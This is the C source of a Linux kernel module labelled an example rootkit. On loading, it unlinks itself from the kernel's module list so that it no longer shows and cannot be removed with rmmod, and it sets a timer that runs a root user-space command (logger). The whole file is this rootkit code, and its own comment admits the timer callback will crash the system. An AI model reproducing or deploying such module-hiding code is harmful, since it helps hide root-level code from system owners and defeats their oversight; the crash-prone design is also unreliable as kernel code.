/*
  This module after loading is making it invisible in modules list
  
  That mean You can not simply 'rmmod it';
*/
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/rculist.h>
#include <linux/sysfs.h>
#include <linux/delay.h>
 
MODULE_LICENSE("GPL");
MODULE_AUTHOR("gotoc");
MODULE_DESCRIPTION("Example module");

static struct timer_list my_timer;

/*
  Simple user space runner
*/
static int simple_usp_runner(void)
{
  char *argv[] = { "/usr/bin/logger", "root!", NULL };
  static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 
  return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/*
  Warrning! This is how to don't write kernel code
  when simple USP will be run it will crash system because 
  call_usermodehelper should have context, but timer callback 
  doesn't have it.
*/
void rootkit_callback(unsigned long data)
{
  printk(KERN_INFO "rootkit_callback (%ld).\n", jiffies);

  simple_usp_runner();
}

static int __init rootkit_init(void)
{
  int ret;  
  struct module *mod = THIS_MODULE;
  
  printk(KERN_INFO "rootkit_mod setting up the timer.\n");

/*
  Lets setup simple timer. Timer resolution depends on kernel parameters
  but don't dream about anything better than 1Hz.
*/
  setup_timer(&my_timer, rootkit_callback, 0);
  ret = mod_timer(&my_timer, jiffies + msecs_to_jiffies(1000));

  if (ret)
    printk(KERN_WARNING "Error in mod_timer\n");

  printk(KERN_INFO "rootkit_mod hidind itself.\n");
/* 
  Based at: kernel/module.c
  The mutex is because of risk another referencing to list.
  in kernel/module.c each list_del operation are in mutex
*/
  mutex_lock(&module_mutex);
  list_del(&mod->list);
  mutex_unlock(&module_mutex);


  printk(KERN_INFO "rootkit_mod done.\n");
  return 0;
}
module_init(rootkit_init);
 
static void __exit rootkit_exit(void)
{
  printk(KERN_INFO "rootkit_mod unloaded.\n");
}
module_exit(rootkit_exit);
